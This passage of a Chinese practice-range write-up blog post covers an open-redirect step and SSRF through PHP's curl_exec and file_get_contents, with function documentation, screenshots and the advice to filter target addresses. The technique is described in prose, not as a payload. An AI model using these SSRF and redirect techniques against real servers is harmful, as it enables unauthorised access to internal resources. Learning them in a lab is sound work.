<p>修改为想跳转的链接即可：如url=<a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com/</a></p>
<p><img src="https://i.loli.net/2021/02/14/JLBbnfIF1KCt32Z.png" srcset="/img/loading.gif"></p>
<p>点击就会跳转到百度页面啦~</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><blockquote>
<p>由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p>
<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP中下面函数的使用不当会导致SSRF:<br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">fsockopen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">curl_exec</span><span class="hljs-params">()</span></span>     <br></code></pre></td></tr></table></figure>


<p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong>。</p>
</blockquote>
<h2 id="SSRF-CURL"><a href="#SSRF-CURL" class="headerlink" title="SSRF(CURL)"></a>SSRF(CURL)</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl:<br>PHP 支持 Daniel Stenberg 创建的 libcurl 库，能够连接通讯各种服务器、使用各种协议。libcurl 目前支持的协议有 http、https、ftp、gopher、telnet、dict、file、ldap。 libcurl 同时支持 HTTPS 证书、HTTP POST、HTTP PUT、 FTP 上传(也能通过 PHP 的 FTP 扩展完成)、HTTP 基于表单的上传、代理、cookies、用户名+密码的认证。<br><br>语法:<br><span class="hljs-function"><span class="hljs-title">curl_init</span><span class="hljs-params">()</span></span>：			初始化 cURL 会话。<br><span class="hljs-function"><span class="hljs-title">curl_setopt</span><span class="hljs-params">()</span></span>：			设置 cURL 传输选项。<br><span class="hljs-function"><span class="hljs-title">curl_exec</span><span class="hljs-params">()</span></span>：			返回 true / false，curl_setopt 设置CURLOPT_RETURNTRANSFER 为 TRUE 时将 curl_exec() 获取的信息以字符串返回。<br><span class="hljs-function"><span class="hljs-title">curl_close</span><span class="hljs-params">()</span></span>：			关闭 cURL 会话。<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/14/tjmCixeIg8L75bo.png" srcset="/img/loading.gif"></p>
<p>原本引用路径的文件内容(编码原因显示乱码)</p>
<p><img src="https://i.loli.net/2021/02/14/JPdANaUfOqmWsyT.png" srcset="/img/loading.gif"></p>
<p>将参数url更改为我们要引用的路径即可</p>
<p><img src="https://i.loli.net/2021/02/14/8RhVbar26LuJtFZ.png" srcset="/img/loading.gif"></p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_get_content()</span>:将指定 URL 的文件读入一个字符串并返回。<br>file<span class="hljs-constructor">_get_contents(<span class="hljs-params">path</span>, <span class="hljs-params">include_path</span>, <span class="hljs-params">context</span>, <span class="hljs-params">start</span>, <span class="hljs-params">max_length</span>)</span><br>	path：要读取的路径或链接。<br>	include_path：是否在路径中搜索文件，搜索则设为 <span class="hljs-number">1</span>，默认为 <span class="hljs-literal">false</span>。<br>	context：修改流的行为，如超时时间，GET<span class="hljs-operator"> / </span>POST 等。<br>	start：开始读文件的位置。<br>	max_length：读取文件的字节数。<br></code></pre></td></tr></table></figure>
<p>同上，只是后端使用的函数不同。</p>
<p><img src="https://i.loli.net/2021/02/14/NO82jecGxVC5A4K.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/14/weaQTJhVq6RgpGr.png" srcset="/img/loading.gif"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>做了两天到后面其实有些力不从心==，不过总算做完了hh~</p>
<p>按照做的情况来看大部分漏洞还算熟悉，</p>
<p>接触较少的有越权、php反序列化、SSRF</p>
<p>理解较少的有XXE</p>
<p>继续努力！</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/01/29/%E5%AD%A6%E6%A0%A1ctf%E8%AE%AD%E7%BB%83%E8%B5%9B%E7%9A%84wp/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">学校ctf训练赛的wp</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/">
                        <span class="hidden-mobile">xss-lab通关小记</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    Fluid.utils.waitElementVisible('vcomments', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz",
          app_key: "y4AXlgIqQsV7Enr3IFS3r6Ck",
          placeholder: "欢迎评论噢~",
          path: window.location.pathname,
          avatar: "retro",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: true,
          recordIP: false,
          serverURLs: "",
        });
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the
    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
  </noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>


  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  

<span id="sitetime"></span>
<script language=javascript>
	function siteTime(){
		window.setTimeout("siteTime()", 1000);
		var seconds = 1000;
		var minutes = seconds * 60;
		var hours = minutes * 60;
		var days = hours * 24;
		var years = days * 365;
		var today = new Date();
		var todayYear = today.getFullYear();
		var todayMonth = today.getMonth()+1;
		var todayDate = today.getDate();
		var todayHour = today.getHours();
		var todayMinute = today.getMinutes();
		var todaySecond = today.getSeconds();
		/* 
		Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
		year - 作为date对象的年份，为4位年份值
		month - 0-11之间的整数，做为date对象的月份
		day - 1-31之间的整数，做为date对象的天数
		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
		minutes - 0-59之间的整数，做为date对象的分钟数
		seconds - 0-59之间的整数，做为date对象的秒数
		microseconds - 0-999之间的整数，做为date对象的毫秒数
        */
		var t1 = Date.UTC(2020,12,30,00,00,00); //北京时间2020-12-30 00:00:00
		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
		var diff = t2-t1;
		var diffYears = Math.floor(diff/years);
		var diffDays = Math.floor((diff/days)-diffYears*365);
		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
		document.getElementById("sitetime").innerHTML=" 自Na0h将神光棒放入此地已"+/*diffYears+" 年 "+*/diffDays+" 天"+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒🌩٩(๏̯๏)۶❤ ";
	}
	siteTime();
</script>


</footer>


<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-MLL1PZ9RBK', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=260676474"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', '260676474');
    </script>
  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>






<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>

</body>
</html>
